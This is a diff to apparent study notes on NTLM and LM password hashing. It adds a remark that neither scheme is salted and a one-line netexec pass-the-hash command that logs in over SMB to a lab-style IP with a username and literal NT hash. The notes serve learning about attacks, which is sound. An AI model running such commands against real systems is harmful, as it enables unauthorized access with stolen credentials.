@@ -207,4 +207,9 @@ Kerberos Key Distribution Center (KDC): Domain Controllers in Active Directory D
 - The protocol has two hashed password values to choose from to perform authentication:
   - the LM hash (as discussed above) 
   - the NT hash, which is the MD4 hash of the little-endian UTF-16 value of the password. The algorithm can be visualized as: MD4(UTF-16-LE(password)).
+  - Neither LANMAN nor NTLM uses a salt.
+
 - NTLM is also vulnerable to the pass-the-hash attack.
+```bash
+netexec smb 10.129.41.19 -u rachel -H e46b9e548fa0d122de7f59fb6d48eaa2
+```
